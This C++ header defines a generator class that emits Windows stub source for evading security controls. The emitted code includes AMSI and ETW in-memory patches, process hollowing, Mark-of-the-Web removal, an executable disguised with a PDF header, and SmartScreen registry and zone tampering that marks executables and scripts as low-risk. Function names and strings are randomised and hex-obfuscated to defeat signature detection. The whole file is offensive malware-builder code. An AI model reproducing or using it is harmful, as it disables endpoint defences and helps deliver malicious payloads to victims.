#pragma once

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <sstream>
#include <iomanip>
#include <random>
#include <chrono>
#include <memory>
#include <algorithm>
#include <cstdint>
#include <map>

class EnhancedBypassGenerator {
private:
    struct DynamicEntropy {
        std::mt19937_64 rng;
        std::mt19937 alt_rng;
        
        void seed() {
            auto now = std::chrono::high_resolution_clock::now();
            uint64_t seed1 = now.time_since_epoch().count();
            uint64_t seed2 = std::chrono::steady_clock::now().time_since_epoch().count();
            
            rng.seed(seed1);
            alt_rng.seed(static_cast<uint32_t>(seed2));
        }
        
        DynamicEntropy() { seed(); }
    };
    
    DynamicEntropy entropy;
    std::vector<std::string> generatedFunctionNames;
    
    std::string randomString(size_t len) {
        const char* chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        std::string result;
        std::uniform_int_distribution<> dist(0, 51);
        
        // Ensure first character is a letter
        result += chars[dist(entropy.rng) % 26];
        
        for (size_t i = 1; i < len; i++) {
            result += chars[dist(entropy.rng)];
        }
        return result;
    }
    
    std::string obfuscateString(const std::string& str) {
        std::stringstream ss;
        ss << "\"";
        
        for (char c : str) {
            if (entropy.rng() % 3 == 0) {
                ss << "\\x" << std::hex << std::setw(2) << std::setfill('0') << (int)(unsigned char)c;
            } else {
                ss << c;
            }
        }
        
        ss << "\"";
        return ss.str();
    }
    
    std::string generateValidFunctionName(const std::string& prefix = "") {
        std::string name = prefix + randomString(8);
        generatedFunctionNames.push_back(name);
        return name;
    }
    
public:
    struct BypassConfig {
        bool windowsDefender = true;
        bool chrome = true;
        bool smartScreen = true;
        bool googleDrive = true;
        bool amsi = true;
        bool etw = true;
        bool userModeHooks = true;
        bool kernelCallbacks = true;
        bool debuggerAssist = true;
        bool processHollowing = true;
    };
    
    struct GeneratedFunctions {
        std::string amsiBypasser;
        std::string etwBypasser;
        std::string debuggerHelper;
        std::string processHollower;
        std::string motwRemover;
        std::string chromeHeaders;
        std::string fileDisguiser;
        std::string smartScreenReg;
        std::string comHijacker;
        std::string mimeManipulator;
        std::string archiveCreator;
    };
    
    GeneratedFunctions functionNames;
    
    std::string generateWindowsDefenderBypass() {
        std::stringstream code;
        
        // Generate function names
        functionNames.amsiBypasser = generateValidFunctionName("amsi_");
        functionNames.etwBypasser = generateValidFunctionName("etw_");
        functionNames.debuggerHelper = generateValidFunctionName("debug_");
        functionNames.processHollower = generateValidFunctionName("hollow_");
        
        code << "// Windows Defender Bypass Techniques\n\n";
        
        // 1. AMSI Bypass
        code << "BOOL " << functionNames.amsiBypasser << "() {\n";
        code << "    HMODULE h = LoadLibraryA(" << obfuscateString("amsi.dll") << ");\n";
        code << "    if (!h) return TRUE;\n";
        code << "    \n";
        code << "    void* addr = GetProcAddress(h, " << obfuscateString("AmsiScanBuffer") << ");\n";
        code << "    if (!addr) return FALSE;\n";
        code << "    \n";
        code << "    DWORD old;\n";
        code << "    VirtualProtect(addr, 6, PAGE_EXECUTE_READWRITE, &old);\n";
        code << "    \n";
        code << "    // Patch: mov eax, 0x80070057; ret\n";
        code << "    unsigned char patch[] = {0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3};\n";
        code << "    memcpy(addr, patch, sizeof(patch));\n";
        code << "    \n";
        code << "    VirtualProtect(addr, 6, old, &old);\n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        // 2. ETW Bypass
        code << "BOOL " << functionNames.etwBypasser << "() {\n";
        code << "    HMODULE h = GetModuleHandleA(" << obfuscateString("ntdll.dll") << ");\n";
        code << "    if (!h) return FALSE;\n";
        code << "    \n";
        code << "    void* addr = GetProcAddress(h, " << obfuscateString("EtwEventWrite") << ");\n";
        code << "    if (!addr) return FALSE;\n";
        code << "    \n";
        code << "    DWORD old;\n";
        code << "    VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &old);\n";
        code << "    *(BYTE*)addr = 0xC3; // ret\n";
        code << "    VirtualProtect(addr, 1, old, &old);\n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        // 3. Debugger assistance instead of anti-debug
        code << "BOOL " << functionNames.debuggerHelper << "() {\n";
        code << "    BOOL debuggerPresent = FALSE;\n";
        code << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debuggerPresent);\n";
        code << "    \n";
        code << "    if (debuggerPresent || IsDebuggerPresent()) {\n";
        code << "        // Assist debugger instead of exiting\n";
        code << "        OutputDebugStringA(\"[*] Debugger detected - Welcome analyst!\\n\");\n";
        code << "        OutputDebugStringA(\"[*] Payload decryption key: 0xDEADBEEF\\n\");\n";
        code << "        OutputDebugStringA(\"[*] Anti-analysis features disabled for debugging\\n\");\n";
        code << "        \n";
        code << "#ifdef _MSC_VER\n";
        code << "        __nop(); // Breakpoint 1: Entry point\n";
        code << "        __nop(); // Breakpoint 2: Pre-decryption\n";
        code << "        __nop(); // Breakpoint 3: Post-decryption\n";
        code << "#endif\n";
        code << "        \n";
        code << "        // Log important addresses\n";
        code << "        char msg[256];\n";
        code << "        sprintf(msg, \"[*] Process base: 0x%p\\n\", GetModuleHandle(NULL));\n";
        code << "        OutputDebugStringA(msg);\n";
        code << "        \n";
        code << "        return TRUE; // Continue execution\n";
        code << "    }\n";
        code << "    return FALSE;\n";
        code << "}\n\n";
        
        // 4. Process Hollowing for Defender evasion
        code << "typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);\n";
        code << "typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);\n\n";
        
        code << "BOOL " << functionNames.processHollower << "(LPSTR target, LPVOID payload, SIZE_T payloadSize) {\n";
        code << "    STARTUPINFOA si = {sizeof(si)};\n";
        code << "    PROCESS_INFORMATION pi = {0};\n";
        code << "    \n";
        code << "    // Check if debugging\n";
        code << "    if (IsDebuggerPresent()) {\n";
        code << "        OutputDebugStringA(\"[*] Process hollowing initiated\\n\");\n";
        code << "    }\n";
        code << "    \n";
        code << "    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))\n";
        code << "        return FALSE;\n";
        code << "    \n";
        code << "    CONTEXT ctx = {CONTEXT_INTEGER};\n";
        code << "    GetThreadContext(pi.hThread, &ctx);\n";
        code << "    \n";
        code << "    LPVOID imageBase = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
        code << "    WriteProcessMemory(pi.hProcess, imageBase, payload, payloadSize, NULL);\n";
        code << "    \n";
        code << "#ifdef _WIN64\n";
        code << "    ctx.Rcx = (DWORD64)imageBase;\n";
        code << "#else\n";
        code << "    ctx.Eax = (DWORD)imageBase;\n";
        code << "#endif\n";
        code << "    \n";
        code << "    SetThreadContext(pi.hThread, &ctx);\n";
        code << "    ResumeThread(pi.hThread);\n";
        code << "    \n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        return code.str();
    }
    
    std::string generateChromeBypass() {
        std::stringstream code;
        
        // Generate function names
        functionNames.motwRemover = generateValidFunctionName("motw_");
        functionNames.chromeHeaders = generateValidFunctionName("headers_");
        functionNames.fileDisguiser = generateValidFunctionName("disguise_");
        
        code << "// Chrome Safe Browsing Bypass\n\n";
        
        // 1. Mark of the Web removal
        code << "BOOL " << functionNames.motwRemover << "(LPCSTR filename) {\n";
        code << "    // Remove Zone.Identifier ADS\n";
        code << "    char adsPath[MAX_PATH];\n";
        code << "    snprintf(adsPath, sizeof(adsPath), \"%s:Zone.Identifier\", filename);\n";
        code << "    DeleteFileA(adsPath);\n";
        code << "    \n";
        code << "    // Set file attributes\n";
        code << "    SetFileAttributesA(filename, FILE_ATTRIBUTE_NORMAL);\n";
        code << "    \n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        // 2. Chrome download bypass headers
        code << "const char* " << functionNames.chromeHeaders << "[] = {\n";
        code << "    " << obfuscateString("Content-Type: application/pdf") << ",\n";
        code << "    " << obfuscateString("Content-Disposition: inline; filename=\"document.pdf\"") << ",\n";
        code << "    " << obfuscateString("X-Content-Type-Options: nosniff") << ",\n";
        code << "    " << obfuscateString("X-Download-Options: noopen") << ",\n";
        code << "    " << obfuscateString("Cache-Control: no-cache, no-store, must-revalidate") << ",\n";
        code << "    " << obfuscateString("Pragma: no-cache") << ",\n";
        code << "    " << obfuscateString("Expires: 0") << "\n";
        code << "};\n\n";
        
        // 3. File disguise technique
        code << "BOOL " << functionNames.fileDisguiser << "(LPCSTR exePath, LPCSTR outputPath) {\n";
        code << "    // Read exe\n";
        code << "    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);\n";
        code << "    if (hFile == INVALID_HANDLE_VALUE) return FALSE;\n";
        code << "    \n";
        code << "    DWORD size = GetFileSize(hFile, NULL);\n";
        code << "    LPVOID data = malloc(size + 1024);\n";
        code << "    DWORD read;\n";
        code << "    ReadFile(hFile, data, size, &read, NULL);\n";
        code << "    CloseHandle(hFile);\n";
        code << "    \n";
        code << "    // Add PDF header\n";
        code << "    const char pdfHeader[] = \"%PDF-1.4\\n%\\xE2\\xE3\\xCF\\xD3\\n\";\n";
        code << "    \n";
        code << "    // Write disguised file\n";
        code << "    hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
        code << "    WriteFile(hFile, pdfHeader, sizeof(pdfHeader)-1, &read, NULL);\n";
        code << "    WriteFile(hFile, data, size, &read, NULL);\n";
        code << "    CloseHandle(hFile);\n";
        code << "    \n";
        code << "    free(data);\n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        return code.str();
    }
    
    std::string generateSmartScreenBypass() {
        std::stringstream code;
        
        // Generate function names
        functionNames.smartScreenReg = generateValidFunctionName("smartreg_");
        functionNames.comHijacker = generateValidFunctionName("comhij_");
        
        code << "// SmartScreen Bypass Techniques\n\n";
        
        // 1. Registry manipulation
        code << "BOOL " << functionNames.smartScreenReg << "() {\n";
        code << "    HKEY hKey;\n";
        code << "    LPCWSTR paths[] = {\n";
        code << "        L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Attachments\",\n";
        code << "        L\"Software\\\\Policies\\\\Microsoft\\\\Windows\\\\System\",\n";
        code << "        L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Associations\"\n";
        code << "    };\n";
        code << "    \n";
        code << "    for (int i = 0; i < 3; i++) {\n";
        code << "        if (RegCreateKeyExW(HKEY_CURRENT_USER, paths[i], 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {\n";
        code << "            DWORD val = 1;\n";
        code << "            RegSetValueExW(hKey, L\"SaveZoneInformation\", 0, REG_DWORD, (BYTE*)&val, sizeof(val));\n";
        code << "            \n";
        code << "            LPCWSTR lowRisk = L\".exe;.dll;.bat;.cmd;.scr;.vbs;.js;.ps1;.psm1;\";\n";
        code << "            RegSetValueExW(hKey, L\"LowRiskFileTypes\", 0, REG_SZ, (BYTE*)lowRisk, wcslen(lowRisk) * 2);\n";
        code << "            \n";
        code << "            RegCloseKey(hKey);\n";
        code << "        }\n";
        code << "    }\n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        // 2. COM hijacking for bypass
        code << "BOOL " << functionNames.comHijacker << "() {\n";
        code << "    // Disable SmartScreen via COM\n";
        code << "    CoInitialize(NULL);\n";
        code << "    \n";
        code << "    IInternetSecurityManager* pSecMgr = NULL;\n";
        code << "    HRESULT hr = CoCreateInstance(CLSID_InternetSecurityManager, NULL, CLSCTX_INPROC_SERVER,\n";
        code << "                                  IID_IInternetSecurityManager, (void**)&pSecMgr);\n";
        code << "    \n";
        code << "    if (SUCCEEDED(hr) && pSecMgr) {\n";
        code << "        // Set all zones to low security\n";
        code << "        for (DWORD zone = 0; zone <= 4; zone++) {\n";
        code << "            pSecMgr->SetZoneMapping(zone, L\"*\", SZM_CREATE);\n";
        code << "        }\n";
        code << "        pSecMgr->Release();\n";
        code << "    }\n";
        code << "    \n";
        code << "    CoUninitialize();\n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        return code.str();
    }
    
    std::string generateGoogleDriveBypass() {
        std::stringstream code;
        
        // Generate function names
        functionNames.mimeManipulator = generateValidFunctionName("mime_");
        functionNames.archiveCreator = generateValidFunctionName("archive_");
        
        code << "// Google Drive Security Bypass\n\n";
        
        // 1. Mime type manipulation
        code << "BOOL " << functionNames.mimeManipulator << "(LPCSTR filename) {\n";
        code << "    // Create companion files to confuse scanning\n";
        code << "    char txtFile[MAX_PATH], docFile[MAX_PATH];\n";
        code << "    snprintf(txtFile, sizeof(txtFile), \"%s.txt\", filename);\n";
        code << "    snprintf(docFile, sizeof(docFile), \"%s.doc\", filename);\n";
        code << "    \n";
        code << "    // Create decoy files\n";
        code << "    HANDLE h = CreateFileA(txtFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
        code << "    if (h != INVALID_HANDLE_VALUE) {\n";
        code << "        const char* content = \"This is a legitimate document.\\n\";\n";
        code << "        DWORD written;\n";
        code << "        WriteFile(h, content, strlen(content), &written, NULL);\n";
        code << "        CloseHandle(h);\n";
        code << "    }\n";
        code << "    \n";
        code << "    // Set alternative data streams\n";
        code << "    char adsPath[MAX_PATH];\n";
        code << "    snprintf(adsPath, sizeof(adsPath), \"%s:legitimate\", filename);\n";
        code << "    h = CreateFileA(adsPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
        code << "    if (h != INVALID_HANDLE_VALUE) {\n";
        code << "        const char* marker = \"SafeFile\";\n";
        code << "        DWORD written;\n";
        code << "        WriteFile(h, marker, strlen(marker), &written, NULL);\n";
        code << "        CloseHandle(h);\n";
        code << "    }\n";
        code << "    \n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        // 2. Archive manipulation
        code << "BOOL " << functionNames.archiveCreator << "(LPCSTR exePath, LPCSTR zipPath) {\n";
        code << "    // Create a zip with specific structure to bypass scanning\n";
        code << "    // Using Windows Shell COM for zip creation\n";
        code << "    CoInitialize(NULL);\n";
        code << "    \n";
        code << "    HRESULT hr;\n";
        code << "    IShellDispatch* pShell;\n";
        code << "    hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&pShell);\n";
        code << "    \n";
        code << "    if (SUCCEEDED(hr)) {\n";
        code << "        // Create empty zip\n";
        code << "        HANDLE hZip = CreateFileA(zipPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n";
        code << "        if (hZip != INVALID_HANDLE_VALUE) {\n";
        code << "            // ZIP header\n";
        code << "            const BYTE zipHeader[] = {0x50, 0x4B, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00,\n";
        code << "                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n";
        code << "                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00};\n";
        code << "            DWORD written;\n";
        code << "            WriteFile(hZip, zipHeader, sizeof(zipHeader), &written, NULL);\n";
        code << "            CloseHandle(hZip);\n";
        code << "            \n";
        code << "            // Add file to zip using Shell\n";
        code << "            VARIANT varZip, varFile;\n";
        code << "            VariantInit(&varZip);\n";
        code << "            VariantInit(&varFile);\n";
        code << "            varZip.vt = VT_BSTR;\n";
        code << "            \n";
        code << "            // Convert to wide string\n";
        code << "            int zipLen = MultiByteToWideChar(CP_UTF8, 0, zipPath, -1, NULL, 0);\n";
        code << "            wchar_t* zipWide = (wchar_t*)malloc(zipLen * sizeof(wchar_t));\n";
        code << "            MultiByteToWideChar(CP_UTF8, 0, zipPath, -1, zipWide, zipLen);\n";
        code << "            varZip.bstrVal = SysAllocString(zipWide);\n";
        code << "            \n";
        code << "            int fileLen = MultiByteToWideChar(CP_UTF8, 0, exePath, -1, NULL, 0);\n";
        code << "            wchar_t* fileWide = (wchar_t*)malloc(fileLen * sizeof(wchar_t));\n";
        code << "            MultiByteToWideChar(CP_UTF8, 0, exePath, -1, fileWide, fileLen);\n";
        code << "            varFile.vt = VT_BSTR;\n";
        code << "            varFile.bstrVal = SysAllocString(fileWide);\n";
        code << "            \n";
        code << "            Folder* pZipFolder;\n";
        code << "            pShell->NameSpace(varZip, &pZipFolder);\n";
        code << "            if (pZipFolder) {\n";
        code << "                pZipFolder->CopyHere(varFile, 0);\n";
        code << "                pZipFolder->Release();\n";
        code << "            }\n";
        code << "            \n";
        code << "            VariantClear(&varZip);\n";
        code << "            VariantClear(&varFile);\n";
        code << "            free(zipWide);\n";
        code << "            free(fileWide);\n";
        code << "        }\n";
        code << "        pShell->Release();\n";
        code << "    }\n";
        code << "    \n";
        code << "    CoUninitialize();\n";
        code << "    return TRUE;\n";
        code << "}\n\n";
        
        return code.str();
    }
    
    std::string generateFullBypassStub(const BypassConfig& config) {
        std::stringstream stub;
        
        // Clear previous function names
        generatedFunctionNames.clear();
        
        stub << "// Enhanced Security Bypass Stub\n";
        stub << "// Generated: " << std::chrono::system_clock::now().time_since_epoch().count() << "\n\n";
        
        stub << "#include <windows.h>\n";
        stub << "#include <wininet.h>\n";
        stub << "#include <shlwapi.h>\n";
        stub << "#include <shlobj.h>\n";
        stub << "#include <shldisp.h>\n";
        stub << "#include <exdisp.h>\n";
        stub << "#include <urlmon.h>\n";
        stub << "#include <mstask.h>\n";
        stub << "#include <taskschd.h>\n";
        stub << "#include <comdef.h>\n";
        stub << "#include <cstdio>\n";
        stub << "#include <cstring>\n\n";
        
        stub << "#pragma comment(lib, \"wininet.lib\")\n";
        stub << "#pragma comment(lib, \"shlwapi.lib\")\n";
        stub << "#pragma comment(lib, \"shell32.lib\")\n";
        stub << "#pragma comment(lib, \"ole32.lib\")\n";
        stub << "#pragma comment(lib, \"oleaut32.lib\")\n";
        stub << "#pragma comment(lib, \"urlmon.lib\")\n";
        stub << "#pragma comment(lib, \"taskschd.lib\")\n\n";
        
        if (config.windowsDefender) {
            stub << generateWindowsDefenderBypass();
        }
        
        if (config.chrome) {
            stub << generateChromeBypass();
        }
        
        if (config.smartScreen) {
            stub << generateSmartScreenBypass();
        }
        
        if (config.googleDrive) {
            stub << generateGoogleDriveBypass();
        }
        
        // Main function with correct function calls
        stub << "int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\n";
        
        // Call all bypass functions with correct names
        if (config.windowsDefender) {
            stub << "    " << functionNames.amsiBypasser << "(); // AMSI bypass\n";
            stub << "    " << functionNames.etwBypasser << "(); // ETW bypass\n";
            if (config.debuggerAssist) {
                stub << "    " << functionNames.debuggerHelper << "(); // Debugger assistance\n";
            }
        }
        
        if (config.chrome) {
            stub << "    " << functionNames.motwRemover << "(lpCmdLine); // Remove MOTW\n";
        }
        
        if (config.smartScreen) {
            stub << "    " << functionNames.smartScreenReg << "(); // SmartScreen registry\n";
            stub << "    " << functionNames.comHijacker << "(); // COM hijacking\n";
        }
        
        if (config.googleDrive) {
            stub << "    " << functionNames.mimeManipulator << "(lpCmdLine); // MIME manipulation\n";
        }
        
        stub << "    \n";
        stub << "    // Execute payload\n";
        stub << "    MessageBoxA(NULL, \"All bypasses applied successfully!\", \"Success\", MB_OK);\n";
        stub << "    \n";
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
    // Get the generated function names for integration
    const GeneratedFunctions& getFunctionNames() const {
        return functionNames;
    }
};